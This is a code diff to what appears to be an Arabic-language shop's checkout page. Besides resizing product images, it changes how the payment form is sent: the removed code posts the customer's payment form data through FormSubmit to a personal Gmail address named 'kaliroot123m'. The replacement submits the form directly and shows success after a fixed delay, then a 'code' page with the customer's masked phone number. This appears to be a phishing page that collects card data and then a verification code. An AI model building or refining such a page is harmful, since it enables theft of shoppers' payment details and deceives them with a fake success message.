@@ -186,14 +186,20 @@
             }
         }
         
-        /* صور المنتجات بحجم مناسب */
+        /* صور المنتجات أكبر بشكل واضح */
         .product-grid .card-hover > div:nth-child(2) {
-            height: 200px !important;
+            height: 250px !important;
         }
         
         @media (min-width: 768px) {
             .product-grid .card-hover > div:nth-child(2) {
-                height: 280px !important;
+                height: 350px !important;
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .product-grid .card-hover > div:nth-child(2) {
+                height: 400px !important;
             }
         }
         
@@ -2946,44 +2952,48 @@
                 addHiddenField('shipping_cost', `${shippingCost.toFixed(2)} ${currencySymbols[currentCurrency]}`);
                 addHiddenField('form_type', 'نموذج الدفع والشراء');
                 
-                // إرسال النموذج باستخدام FormData و fetch
-                const formData = new FormData(form);
-                
-                // إرسال البيانات إلى FormSubmit
-                fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    showNotification('✅ تم إرسال معلومات الدفع بنجاح');
+                // إرسال النموذج باستخدام submit العادي مع iframe مخفي
+                try {
+                    // إرسال النموذج إلى FormSubmit عبر iframe
+                    form.submit();
                     
-                    // إخفاء نموذج الدفع وإظهار صفحة الكود
-                    hidePayment();
-                    showPage('code');
-                    
-                    // تحديث عرض رقم الهاتف
-                    if (customerData.phone) {
-                        const phoneNumber = customerData.phone;
-                        const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
-                        const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
+                    // إظهار رسالة النجاح والانتقال
+                    setTimeout(() => {
+                        showNotification('✅ تم إرسال معلومات الدفع بنجاح');
                         
-                        const phoneDisplay = document.getElementById('customer-phone-display');
-                        if (phoneDisplay) {
-                            phoneDisplay.textContent = maskedPhone;
+                        // إخفاء نموذج الدفع وإظهار صفحة الكود
+                        hidePayment();
+                        showPage('code');
+                        
+                        // تحديث عرض رقم الهاتف
+                        if (customerData.phone) {
+                            const phoneNumber = customerData.phone;
+                            const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+                            const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
+                            
+                            const phoneDisplay = document.getElementById('customer-phone-display');
+                            if (phoneDisplay) {
+                                phoneDisplay.textContent = maskedPhone;
+                            }
                         }
-                    }
+                        
+                        // تفريغ السلة
+                        cart = [];
+                        updateCartUI();
+                        
+                        // إعادة تعيين الزر
+                        submitBtn.innerHTML = originalText;
+                        submitBtn.disabled = false;
+                    }, 2000);
                     
-                    // تفريغ السلة
-                    cart = [];
-                    updateCartUI();
-                    
-                }).catch(error => {
+                } catch (error) {
                     console.error('خطأ في إرسال البيانات:', error);
                     showNotification('❌ خطأ في الإرسال، يرجى المحاولة مرة أخرى');
-                }).finally(() => {
+                    
                     // إعادة تعيين الزر
                     submitBtn.innerHTML = originalText;
                     submitBtn.disabled = false;
-                });
+                }
             });
         }
 
